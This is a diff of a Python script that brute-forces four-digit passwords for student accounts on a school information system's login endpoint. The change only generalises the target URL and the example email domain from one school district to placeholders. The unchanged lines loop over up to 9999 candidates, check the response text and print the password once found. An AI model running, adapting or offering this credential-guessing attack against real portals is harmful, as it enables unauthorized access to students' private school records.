@@ -1,9 +1,9 @@
 import requests  # Import needed module
 
-url      = 'https://parents.genesisedu.com/bernardsboe/sis/j_security_check'  # Define api uri
-checkUrl = 'https://parents.genesisedu.com/bernardsboe/sis/view?gohome=true'  # Define login page
+url      = 'https://parents.genesisedu.com/SCHOOL_PAGE/sis/j_security_check'  # Define api uri
+checkUrl = 'https://parents.genesisedu.com/SCHOOL_PAGE/sis/view?gohome=true'  # Define login page
 
-# Put student Email here (ex: example@bernardsboe.com)
+# Put student Email here (ex: example@domain.com)
 email = ''
 
 assert email != '' # Don't run if email is empty
@@ -24,6 +24,6 @@ for i in range(9999):  # Loop through possible passwords
     if not "Account is inactive" in data.text and not "workStudentId" in data.text:
         continue
     # if passwords is correct print it
-    print(f'\n[*] Complete: {toTry}') 
+    print(f'\n[*] Complete: {toTry}')
     # Exit the loop when the password has been found
     break
